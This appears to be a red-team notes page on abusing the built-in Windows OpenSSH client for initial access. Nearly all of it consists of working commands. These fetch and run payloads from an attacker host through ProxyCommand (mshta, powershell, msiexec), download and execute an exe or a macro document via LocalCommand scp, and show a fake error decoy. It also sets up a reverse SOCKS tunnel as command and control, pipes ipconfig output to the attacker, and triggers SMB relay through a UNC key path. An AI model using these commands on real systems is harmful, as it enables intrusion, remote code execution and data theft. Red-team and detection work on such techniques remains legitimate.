---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-foreign-land
  - living-off-the-land
  - windows
---
# Remote Clients

## SSH

## Common Files

```
C:\Windows\System32\OpenSSH\ssh.exe
```

### Payload Execution

#### Fileless Malware

```
C:\> ssh.exe -o ProxyCommand="powershell.exe powershell.exe ('mshta.exe http[s]://<attacker_IP>/payload.txt')" .
```

Executing MSI payloads.

```
C:\> ssh.exe -o ProxyCommand="msiexec.exe /quiet /qn /i http[s]://<attacker_IP>/payload.msi"
```

#### Decoys

You can include make a decoy using [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x09 - Miscellaneous/Troll/Windows/Manual/Living off the Land|messagebox]].

```
C:\> ssh.exe -o ProxyCommand="cmd.exe /c <commands> & msg.exe * Error 0x4e23a: Incomplete File."
```

### Reverse Tunneling SOCKS Proxy

> [!INFO] Configuring SSH Server
> Refer to this [[04 - Remote Port Forwarding|section]] for remote port forwarding to configure the user without any requirement for authentication.

Instead of dropping malware instead we'll use [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x05 - Pivot/Linux/SOCKS Proxy/Proxychains|proxychains]] or [[02 - Configure Proxies#^0a4669|privoxy]] with the SSH server (the attacker's server) as the command and control which is legitimate, safer, and more familiar performing things remotely. This is considered as a non-malware payload.

```
C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -NTfCqR [127.0.0.1:]<SOCKS_proxy> -o "StrictHostKeyChecking=no"
%SYSTEMDIRECTORY%\OpenSSH\ssh.exe [-p <PORT>] -NTfCqR [127.0.0.1:]<SOCKS_proxy> -o "StrictHostKeyChecking=no"
```

In the SSH server we should see a listening port of the SOCKS Proxy.

```
$ ss -antpl
```

However, there is a limitation since it contains no limitation. To resolve this issue you must perform local enumeration to gather information of the compromised target that was established via SSH. Include a shell scripting file or a custom dropper containing commands to automate the process. It doesn't have to be all of them but the more the better. At least collect the IPv4 address.

```
ipconfig /all | C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] "cat - > %COMPUTERNAME%_IP_configuration.txt"
ipconfig /all | %SYSTEMDIRECTORY%\OpenSSH\ssh.exe [-p <PORT>] "cat - > %COMPUTERNAME%_IP_configuration.txt"
```

### Download File and Execute

Transfer file to the system.

```
C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -o "StrictHostKeyChecking=no PermitLocalCommand=yes" -o "LocalCommand=scp [-P <PORT>] <username>@<attacker_IP>:payload.exe %AppData%\Microsoft\Templates\payload.exe\. && %APPDATA%\Microsoft\Templates\payload.exe" <username>@<attacker_IP>
```

TODO: This can be used to transfer embedded macro document to bypass MOTW.

```
C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -o "StrictHostKeyChecking=no PermitLocalCommand=yes" -o "LocalCommand=scp [-P <PORT>] <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\invoice.doc\. && %APPDATA%\Microsoft\Templates\invoice.doc" <username>@<attacker_IP>
```

### SMB Relay

For SSH server it doesn't to be from an attacker side. It can a real one as long the UNC path is set in order to execute command to perform SMB relay attack.

```
C:\> ssh -i \\<attacker_IP>\key.pem root@<IP>
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x04 - File Transfer and Data Exfiltration/Cross Platform/Network Ports/SSH/Usage|File Transfer: SCP]]

### LOLBAS

- [LOLBAS: SSH](https://lolbas-project.github.io/lolbas/Binaries/Ssh/)

### Bitsadmin

- [BITSADMIN Blog: Living Off the Foreign Land](https://blog.bitsadmin.com/living-off-the-foreign-land-windows-as-offensive-platform)

### RedSiege

- [RedSiege: SSHishing - Abusing Shortcut Files and the Windows SSH Client for Initial Access](https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/)

### JumpSec

- [JumpSec: SSH Tunnelling to Punch Through Corporate Firewalls - Updated take on one of the oldest LOLBINs](https://labs.jumpsec.com/ssh-tunnelling-to-punch-through-corporate-firewalls-updated-take-on-one-of-the-oldest-lolbins/)

- [JumpSec: Bring Your Own Trusted Binary (BYOTB) - BSides Edition](https://labs.jumpsec.com/bring-your-own-trusted-binary-byotb-bsides-edition/)